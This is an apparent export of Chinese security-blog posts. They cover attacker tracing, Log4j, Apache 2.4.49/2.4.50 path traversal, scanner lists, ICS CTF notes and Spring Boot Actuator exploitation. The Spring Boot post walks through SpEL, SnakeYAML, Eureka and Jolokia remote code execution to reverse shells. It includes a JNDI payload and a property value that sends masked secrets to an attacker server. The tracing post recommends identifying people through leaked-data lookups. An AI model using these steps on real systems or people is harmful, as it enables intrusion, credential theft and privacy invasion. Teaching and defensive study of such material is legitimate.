社交平台，如：钉钉、企业微信等 攻击者个人简历中的工作经历 流程：1.针对ip通过开源情报+开放端口分析查询可利用网站： （主要）  （主要）   当发现某些IP的攻击后，可以尝试通过此IP去溯源攻击者 首先通过网站或者其他接口，查询此IP为IDC的IP、CDN的IP还是普通运营商的出口IP。 如果IP反查到域名就可以去站长之家对其进行whois反查或者去等网站去查询域名的注册信息、查询备案信息等。 端口：可查看开放服务进行进一步利用 可考虑使用masscan快速查看开放端口： masscan -p 1-65535 ip –rate=500 再通过nmap 对开放端口进行识别 nmap -p 3389,3306,6378 -Pn IP 发现相关有用端口，进行端口相关漏洞的挖掘及利用。 2.ip查询定位ip定位工具： 高精度IP定位： rtbasia（IP查询）： ipplus360（IP查询）： IP地址查询在线工具： 在通过IP定位技术溯源过程，应注意以下情况： 假如IP反查到的域名过多，考虑就是CDN了，就没必要继续去查了。 假如是普通运营商的出口IP只能使用一些高精度IP定位工具粗略估计攻击者的地址，如果需要具体定位到人，则需要更多的信息。 3. ID跟踪、得到常用id信息收集在通过IP定位后技术追踪攻击者，可通过指纹库、社工库等或其他技术手段抓取到攻击者的微博账号、百度ID等信息，一般通过以下技术手段实现： 进行QQ等同名方式去搜索、进行论坛等同名方式搜索、社工库匹配等。 如ID是邮箱，则通过社工库匹配密码、以往注册信息等。 如ID是手机号，则通过手机号搜索相关注册信息，以及手机号使用者姓名等。 其他方法： (1) 百度信息收集：“id” （双引号为英文） (2) 谷歌信息收集 (3) src信息收集（各大src排行榜） (4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据） (5) 微信ID收集：微信进行ID搜索（直接发钉钉群一起查） (6) 如果获得手机号（可直接搜索支付宝、社交账户等） 注意：获取手机号如果自己查到的信息不多，直接上报钉钉群（利用共享渠道对其进行二次社工） 豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集 例如，当通过ID追踪技术手段定位到某攻击者的QQ号、QQ网名等信息，通过专业社工库可以进一步追踪攻击者使用的QQ号注册过的其它网络ID，从而获取更多攻击者信息，从而确定攻击者的身份。 注意：手机号、昵称ID均为重点数据，如查不到太多信息，直接上报指挥部。 4.预警设备信息取证上方数据一无所获，可考虑对其发起攻击的行为进行筛查，尝试判断其是否有指纹特征。 攻击者如果在攻击过程中对攻击目标上传攻击程序（如钓鱼软件），可通过对攻击者上传的恶意程序进行分析，并结合IP定位、ID追踪等技术手段对攻击进行分析溯源，常用的恶意程序分析网站有： Ø 微步在线云沙箱： Ø Virustotal： Ø 火眼（） Ø Anubis（） Ø joe（） 5.跳板机信息收集(触发)进入红队跳板机查询相关信息，如果主机桌面没有敏感信息，可针对下列文件进行收集信息。 Last: 查看登录成功日志 Cat ~/.bash_history 查看操作指令 Ps -aux 查看进程 Cat /etc/passwd 查看是否有类似ID的用户 重点关注uid为500以上的登录用户 nologin为不可登录 注：如有侵权请联系删除"},{"title":"log4j原理分析","date":"2022-07-20T09:27:04.000Z","url":"/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","tags":[["log4j","/tags/log4j/"]],"categories":[["漏洞","/categories/%E6%BC%8F%E6%B4%9E/"]],"content":"前言：十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。 漏洞描述：由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。简单点说，就是可以通过输入一些具有特殊意义的字符来攻击服务器。 如果入侵者在前端页面上输入了：${jndi:rmi://127.0.0.1:8080/evil} 这串字符， 然后后台用log4j记录了这串字符， log4j会自动使用jndi调用这个地址上的rmi内容。如果这个rmi的内容是删除数据库，重启服务器这种恶意程序，被攻击之后还是趁早跑路吧。（开个玩笑） 关于JNDI：JNDI(Java Naming and Directory Interface)是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA，摘自百度百科。 关于RMI：RMI（remote method invocation）即远程方法调用，是允许运行在一个java虚拟机上的对象调用运行在另外一个java虚拟机上的对象的方法，JAVA RMI实现JAVA程序之间跨越JVM的远程通信。通过RMI可以让调用远程JVM上对象方法，仿佛调用本地JVM上对象方法一样简单、快捷。 漏洞复现：首先，可以先创建一个普通的maven项目， 在pom中引入log4j2.14.0 再创建一个用于开启RMI服务端的java文件 再创建EvilCode恶意程序攻击类， 这里由于是自己的电脑， 还是用经典的calc计算器举粟 最后创建一个启动类， 用于模拟我们的服务器程序， 使用log4j打印日志 先启动RMIServer， 再启动Main， 可以看到， 计算器被弹出了： 可以升级log4j最新版本或者更新jdk较高版本来解决这个问题"},{"title":"文件上传漏洞扫描器和利用工具","date":"2022-05-04T05:51:14.000Z","url":"/2022/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/","tags":[["文件上传","/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"]],"categories":[["工具","/categories/%E5%B7%A5%E5%85%B7/"]],"content":"*0x01 fuxploider介绍* Fuxploider是一种开源渗透测试工具，可自动检测和利用文件上传表单缺陷的过程。该工具能够检测允许上传的文件类型，并能够检测哪种技术最适合在所需的Web服务器上上传Web Shell或任何恶意文件。 *0x02 fuxploider安装* Python3.6+ 如果您的pip有问题(并且您使用Windows)： 对于Docker安装 *0x03 fuxploider使用* 要获取基本选项和开关的列表，请使用： 帮助： "},{"title":"windows&kali集成版","date":"2022-04-20T01:20:52.000Z","url":"/2022/04/20/windows-kali%E9%9B%86%E6%88%90%E7%89%88/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"​ @真琴师傅基于Windows打造的一个渗透测试套件工具包。 github项目地址  本项目制作的初衷是帮助渗透新手快速搭建工作环境，工欲善其事，必先利其器。 其中包括的有：系统环境、渗透、逆向、CTF及其他常用工具等，更多详情可进项目中查看。 软件及工具介绍： 链接： 提取码：dhck"},{"title":"github上开源扫描器集合","date":"2022-01-07T08:43:07.000Z","url":"/2022/01/07/github%E4%B8%8A%E5%BC%80%E6%BA%90%E6%89%AB%E6%8F%8F%E5%99%A8%E9%9B%86%E5%90%88/","categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"简介#Scanners-Box是一个集合github平台上的安全行业从业人员自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器；该仓库只收录各位网友自己编写的一般性开源扫描器，类似nmap、w3af、brakeman等知名扫描工具不收录。 子域名枚举# lijiejie/subDomainsBrute (经典的子域名爆破枚举脚本) ring04h/wydomain (子域名字典穷举) le4f/dnsmaper (子域名枚举与地图标记) 0xbug/orangescan (在线子域名信息收集工具) TheRook/subbrute （根据DNS记录查询子域名) We5ter/GSDF (基于谷歌SSL透明证书的子域名查询脚本) mandatoryprogrammer/cloudflare_enum （使用CloudFlare进行子域名枚举的脚本） guelfoweb/knock (Knock子域名获取，可用于查找子域名接管漏洞) Evi1CLAY/CoolPool （多方式收集目标子域名信息） code-scan/BroDomain (兄弟域名查询） chuhades/dnsbrute (高效的子域名爆破工具) 数据库扫描# 0xbug/SQLiScanner (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具) stamparm/DSSS (99行代码实现的sql注入漏洞扫描器) LoRexxar/Feigong （针对各种情况自由变化的MySQL注入脚本） youngyangyang04/NoSQLAttack (一款针对mongoDB的攻击工具) Neohapsis/bbqsql （SQL盲注利用框架） NetSPI/PowerUpSQL （攻击SQLSERVER的Powershell脚本框架） WhitewidowScanner/whitewidow (又一款数据库扫描器) stampery/mongoaudit (MongoDB审计及渗透工具） torque59/Nosql-Exploitation-Framework (NoSQL扫描/爆破工具） 弱口令或信息泄漏扫描# lijiejie/htpwdScan (一个简单的HTTP暴力破解、撞库攻击脚本) lijiejie/BBScan (一个迷你的信息泄漏批量扫描脚本) lijiejie/GitHack (.git文件夹泄漏利用工具)  (端口及弱口令检测) ysrc/F-Scrack （对各类服务进行弱口令检测的脚本) Mebus/cupp （根据用户习惯生成弱口令探测字典脚本） RicterZ/genpAss （中国特色的弱口令生成器） netxfly/crack_ssh （go写的协程版的ssh\\redis\\mongodb弱口令破解工具） n0tr00t/Sreg (通过输入email、phone、username的返回用户注册的所有互联网护照信息) repoog/GitPrey (GitHub敏感信息扫描工具) dxa4481/truffleHog (GitHub敏感信息扫描工具,包括检测commit等) LandGrey/pydictor (暴力破解字典建立工具) 物联网设备扫描# rapid7/IoTSeeker （物联网设备默认密码扫描检测工具) shodan-labs/iotdb (使用nmap扫描IoT设备) jh00nbr/Routerhunter-2.0 （路由器设备漏洞扫描利用) scu-igroup/telnet-scanner (telnet服务密码撞库) XSS扫描# shawarkhanethicalhacker/BruteXSS （Cross-Site Scripting Bruteforcer） 1N3/XSSTracer (A small python script to check for Cross-Site Tracing)  (PHP版本的反射型xss扫描) chuhades/xss_scan (批量扫描xss的python脚本） BlackHole1/autoFindXssAndCsrf (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件） UltimateHackers/XSSight (自动化XSS扫描） 企业网络自检# sowish/LNScan （详细的内部网络信息扫描器） SkyLined/LocalNetworkScanner (javascript实现的本地网络扫描器) ysrc/xunfeng (网络资产识别引擎，漏洞检测引擎） laramies/theHarvester （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts） x0day/Multisearch-v2 (bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息） webshell检测以及病毒分析工具# We5ter/Scanners-Box （简单的php后门检测工具以及webshell样本库） ym2011/ScanBackdoor （Webshell扫描工具）  （A toolkit find malicious, hidden and suspicious PHP scripts and shells in a chosen destination） he1m4n6a/findWebshell （又一款webshell检测工具) Tencent/HaboMalHunter （哈勃分析系统，linux系统病毒分析及安全检测） PlagueScanner/PlagueScanner (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎) nbs-system/php-malware-finder (一款高效率PHP-webshell扫描工具) emposha/PHP-Shell-Detector (测试效率高达99%的webshell检测工具) 内网渗透# 0xwindows/VulScritp （企业内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等） lcatro/network_backdoor_scanner （基于网络流量的内网探测框架） fdiskyou/hunter （调用 Windows API 枚举用户登录信息） BlackHole1/WebRtcXSS （自动化利用XSS入侵内网） 端口扫描、指纹识别以及中间件扫描# ring04h/wyportmap (目标端口扫描+系统服务指纹识别) ring04h/weakfilescan (动态多线程敏感信息泄露检测工具) EnableSecurity/wafw00f (WAF产品指纹识别) rbsec/sslscan （ssl类型识别) urbanadventurer/WhatWeb (web指纹识别) tanjiti/FingerPrint (web应用指纹识别) nanshihui/Scan-T （网络爬虫式指纹识别) OffensivePython/Nscan (a fast Network scanner inspired by Masscan and Zmap) ywolf/F-NAScan (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别） ywolf/F-MiddlewareScan （中间件扫描）  (Web path scanner)  （C段Banner与路径扫描） RASSec/RASscan (端口服务扫描)  （waf自动暴破）  (尝试找出cdn背后的真实ip) Xyntax/BingC （基于Bing搜索引擎的C段/旁站查询，多线程，支持API） Xyntax/DirBrute （多线程WEB目录爆破工具） zer0h/httpscan （一个爬虫式的网段Web主机发现小工具） lietdai/doom （thorn上实现的分布式任务分发的ip端口漏洞扫描器）  (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议) Nitr4x/whichCDN (CDN识别、检测） secfree/bcrpscan (基于爬虫的web路径扫描器) mozilla/ssh_scan (服务器ssh配置信息扫描） 专用扫描器# blackye/Jenkins (Jenkins漏洞探测、用户抓取爆破) code-scan/dzscan (discuz扫描) chuhades/CMS-Exploit-Framework (CMS攻击框架) lijiejie/IIS_shortname_Scanner (an IIS shortname Scanner) riusksk/FlashScanner (flashxss扫描) coffeehb/SSTIF （一个Fuzzing服务器端模板注入漏洞的半自动化工具） epinna/tplmap (服务器端模板注入漏洞检测与利用工具) cr0hn/dockerscan (docker扫描工具) 无线网络渗透、扫描# savio-code/fern-wifi-cracker (无线安全审计工具) m4n3dw0lf/PytheM （Python网络/渗透测试工具） P0cL4bs/WiFi-Pumpkin （无线安全渗透测试套件） 代码静态扫描、代码运行栈跟踪# wufeifei/cobra (白盒代码安全审计系统) OneSourceCat/phpvulhunter (静态php代码审计) Qihoo360/phptrace (跟踪、分析PHP运行情况的工具） ajinabraham/NodeJsScan (NodeJS应用代码审计） 模块化扫描、综合扫描器# az0ne/AZScanner (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测) blackye/lalascan (自主开发的分布式web漏洞扫描框架，集合owasp top10漏洞扫描和边界资产发现能力) blackye/BkScanner (BkScanner 分布式、插件化web漏洞扫描器) ysrc/GourdScanV2 （被动式漏洞扫描)  (WEB渗透测试数据库) netxfly/passive_scan (基于http代理的web漏洞扫描器) 1N3/Sn1per (自动化扫描器，包括中间件扫描以及设备指纹识别) RASSec/pentestEr_Fully-automatic-scanner （定向全自动化渗透测试工具）  （自动化渗透测试框架)  (扫描效果未验证）  （渗透测试插件化并发框架）  （Scanner in Python3.5 for SQLi/XSS/LFI/RFI and other Vulns）  （web端的在线漏洞扫描）  (开发中…) APT#  (一款APT入侵痕迹扫描器) "},{"title":"工控安全CTF入门小记","date":"2021-11-18T07:40:28.000Z","url":"/2021/11/18/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8CTF%E5%85%A5%E9%97%A8%E5%B0%8F%E8%AE%B0/","categories":[["CTF","/categories/CTF/"]],"content":"知识库工控安全入门分析  工控安全基础概念初探  ICS_CTF Contest  工控安全-Freebuf  工控安全系列文章  深度解析工控网络流量特点  工控CTF技能点学习总结  Siemens PLC指纹提取方法汇总  ZoomEye工控专题  Fofa工控专题  在线靶场纵横网络靶场社区  历届比赛真题包括2018工业信息安全大赛、2019工业信息安全大赛、2018护网杯等题目  相关分析与WriteUpCTF工业信息安全大赛实践与分析  一道MMS工控协议CTF题的WriteUp  2018工业信息安全技能大赛华东赛区初赛  老题新招 | 再解工控CTF流量分析题  2019工业信息安全竞赛部分  2019 工业信息安全竞赛总结  由一道工控路由器固件逆向题目看命令执行漏洞  一些工具脚本工控CTF比赛工具，各种网络数据包处理脚本  分析工控网络流量的工具  其他一些好用的过滤条件 ip contains flag.txt modbus&amp;&amp;modbus.func_code==16 s7comm&amp;&amp;s7comm.param.func==0x05 mms.confirmedServiceRequest==73 规律mms协议有关的流量分析题目，可以先搜索flag，png等关键字符串，如果检索不到可以尝试搜索对应的十六进制，比如666c（’fl’） 找到fileopen（72）对应的No. 接着使用这一条mms.confirmedServiceRequest==73过滤fileread（73）操作的条目 观察那一条大于fileopen的No. 找到invokeID 接着找对应的mms.invokeID==No. 会发现mms.confirmed_ResponsePDU，这个的十六进制值就存在flag内容"},{"title":"Apache 2.4.49","date":"2021-10-15T02:09:10.000Z","url":"/2021/10/15/Apache-2-4-49/","tags":[["Apache 2.4.49","/tags/Apache-2-4-49/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"漏洞描述 Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。 影响版本 Apache HTTPd 2.4.49/2.4.50版本 验证过程 Apache HTTPd 2.4.49 任意文件读取漏洞验证： GET数据包： Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。 POST数据包： Apache HTTPd 2.4.50 命令执行测试： 一个图片总结这次ApacheHTTPd 2.4.50版本修复不完善。 修复建议 建议使用Apache HTTPd 2.4.49 与Apache HTTPd 2.4.50 版本的服务器更新Apache HTTPd 版本至最新。 检测工具 Apache 2.4.49 (CVE-2021-41773)Apache 2.4.50 (CVE-2021-42013)批量多线程检测工具：Github地址：  "},{"title":"Spring Boot Actuator未授权访问利用实战利用","date":"2021-09-17T10:39:53.000Z","url":"/2021/09/17/Spring%20Boot%20Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/","tags":[["Spring Boot","/tags/Spring-Boot/"]],"categories":[["渗透","/categories/%E6%B8%97%E9%80%8F/"]],"content":"Spring Boot 集合前言Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE 版本Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合 组件版本相互依赖关系 Spring Cloud 与 Spring Boot 版本之间的依赖关系 Spring Cloud 小版本号的后缀及含义 [TOC] 环境搭建环境准备：JDK 1.8 or later and Maven 3.2+ 漏洞环境集合源码 下面是网盘中的资源包对应的命令执行漏洞 修改监听端口(不修改的话默认只能在搭建环境主机上访问) 安装 启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务) 访问显示springboot欢迎页面 当访问错误页面时，会提示错误信息 这里访问env就可以看到环境特性 访问health显示应用的健康状态 漏洞集合1.信息泄露1.1.路由及接口调用详情泄露 开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等 可以访问以下swagger相关路由进行验证 一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全“ 来讲，不暴露出这些信息更加安全。 对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞 还有一些内置的端点路由由于未设置actuator访问控制暴露 所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义 其中对寻找漏洞比较重要接口的有： /env、/actuator/env GET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文； 同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。 /refresh、/actuator/refresh POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。 /restart、/actuator/restart 暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。 /jolokia、/actuator/jolokia 可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。 /trace、/actuator/httptrace 一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。 除了上面一些端点路由，还有程序员自定义的根路径 /manage、/management、项目APP相关名称 修改内置端点名字(如有些时候/env被程序员修改为/appenv) 1.2.端点路由泄露导致敏感信息泄露认证字段的获取以证明可影响其他用户 这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP头等），还有用户 token、cookie字段 trace 路径： 用户字段泄露: 通过替换 token 字段可获取其他用户的信息 数据库账户密码泄露 由于 actuator 会监控站点 mysql、mangodb之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码： Gitlab源代码泄露 这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git项目地址： 后台用户账号密码泄露 这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof堆转储文件。在 Android studio打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码 1.3获取星号脱敏的密码明文方法一 访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果 利用条件 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知） 利用过程步骤一:确定属性名 访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性 步骤二:jolokia 调用相关 Mbean 这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到 调用 org.springframework.boot Mbean 实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法 spring 1.x spring 2.x 调用 org.springframework.cloud.context.environment Mbean 实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法 spring 1.x spring 2.x 调用其他 Mbean 目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。 方法二利用条件 可以 GET 请求目标网站的 /env 可以 POST 请求目标网站的 /env 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用了 spring-cloud-starter-netflix-eureka-client 依赖 目标可以请求攻击者的服务器（请求可出外网） 利用方法步骤一:确定属性名 访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性 步骤二： 使用 nc 监听 HTTP 请求 在自己控制的外网服务器上监听 80 端口： 步骤三： 触发对外 http 请求 eureka.client.serviceUrl.defaultZone=:$&#123;属性&#125;@your-vps-ip:port 属性替换为想要获取的目标属性 your-vps-ip 换成自己外网服务器的真实 ip 地址 port为前面监听的端口 eureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况） spring 1.x spring 2.x spring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况） spring 1.x spring 2.x 步骤四： 刷新配置 spring 1.x spring 2.x 步骤五： 解码属性值 正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容： 将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。 方法三利用条件 可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口 利用方法步骤一:确定属性名 访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性 步骤二:下载 jvm heap 信息 下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G GET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息 步骤三:使用 MAT 获得 jvm heap 中的密码明文 参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句 辅助用 “password“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。 2.命令执行2.1.whitelabel error page SpEL RCE利用条件 spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 至少知道一个触发 springboot 默认错误页面的接口及参数名 利用方法步骤一: 找到目标网站正常传参点 比如发现访问 /xxxx?id=xxx ，页面会报状态码为 500 的默认错误页面 步骤二: 确认漏洞点 输入 /xxxx?id=$&#123;运算表达式&#125; (假设运算表达式为7x7) 如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。 步骤三: 命令执行漏洞利用 运行代码将执行的命令字符串转换成 0x** java 字节形式(只需将target变量修改为需要执行的命令即可) 执行 open -a Calculator 命令 利用实例环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方 在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章点击这里) 访问${7*7} 可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用 下面将花括号里面的修改成需要执行的命令 首先要将命令字符串转换为java字节形式，利用上面的python脚本 这里执行的命令为bash反弹shell，先将其进行base64编码转换(在线转换地址) 在将其转换为java字节 使用nc监听192.168.233.243的9090端口 将转换后的java字节拼接到payload中，在浏览器中访问 反弹shell成功 利用原理 spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 $&#123;&#125; 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞 详细分析参见下文: ​ SpringBoot SpEL表达式注入漏洞-分析与复现 2.2Spring clound SnakeYAML RCE利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 利用方法步骤一: 托管yml和jar文件 首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问 在根目录下放置yml文件，内容如下: 在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 yaml-payload 步骤二： 设置 spring.cloud.bootstrap.location 属性 spring 1.x spring 2.x 步骤三： 刷新配置 spring 1.x spring 2.x 利用实例这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务 在根目录下放置yml文件，内容如下: 在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 yaml-payload (代码也在网盘里面，为springcloud-snakeyaml-rce/yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java) 只需将exec()里面修改为执行的命令即可 将其进行打包成jar包 使用python快速开启http服务 通过burp抓包并修改请求报文 然后修改请求报文/refresh，刷新配置文件 反弹shell成功 利用原理 spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址 refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化 实例化类时执行恶意代码，造成 RCE 漏洞 分析详情参见下文 Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记 2.3.Eureka服务漏洞Eureka服务漏洞需要存在两个包 利用条件 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网） Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt; span=””&gt;/env中搜寻Netflix关键字判断时候可能存在Eureka服务 Eureka服务属性被设置为恶意的外部Eureka serverURL地址时，通过/refresh会触发目标机器请求远程URL,Eureka serverURL可通过在/env处POST数据进行更改 利用方法步骤一: 架设响应Xstream payload的网站 提供一个依赖 Flask 并符合要求的 python 脚本示例，作用是利用目标 Linux 机器上自带的 python 来反弹shell。 使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。 步骤二：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性 spring 1.x spring 2.x 步骤四：刷新配置 spring 1.x spring 2.x 利用实例使用python 在服务器上搭建一个响应XStream payload的Web服务，代码如下： Python3启动web,如下: 使用Burp构造请求报文发送POST请求 刷新配置 kali开启监听端口1234获取反弹shell 注：该漏洞的成功利用与jdk版本有关，此处用的是1.8.0_161 利用原理 eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址 refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞 详细分析参见下文 Spring Boot Actuator从未授权访问到getshell 2.4.Jolokia漏洞 XXE利用条件 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过 利用方法步骤一:查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。 步骤二：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 在根目录放置以 xml 结尾的 example.xml 文件，内容如下： 步骤三：准备要执行的 Java 代码 编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java， 使用Maven对其进行编译打包： 然后将生成的 jar包拷贝到 步骤二 中的网站根目录。 步骤四：架设恶意 RMI 服务 设置RMI服务的ip地址和开启服务端口8090 